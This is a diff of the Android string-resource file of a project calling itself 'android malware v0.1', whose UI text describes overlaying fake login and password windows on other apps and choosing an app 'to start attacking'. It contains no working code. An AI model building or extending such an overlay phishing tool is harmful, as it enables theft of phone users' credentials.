@@ -1,7 +1,7 @@
 <resources>
     <string name="app_name">android malware v0.1</string>
     <string name="app_ver">android malware v0.1</string>
-    <string name="description">This setting injects your application by adding a fake window with a login and a password on top of the applications</string>
+    <string name="description">This setting injects your phone applications by adding a fake window with a login and a password on top of the applications</string>
     <string name="choose">Choose application to start attacking.</string>
     <string name="log">Check log of injection process.</string>
     <string name="contribute">Contribute to the project</string>
@@ -14,4 +14,8 @@
 
     <string name="action_settings">Settings</string>
     <string name="site">h3xb0y.me</string>
+    <string name="title_activity_about">AboutActivity</string>
+
+    <!-- TODO: Remove or change this placeholder text -->
+    <string name="hello_blank_fragment">Hello blank fragment</string>
 </resources>
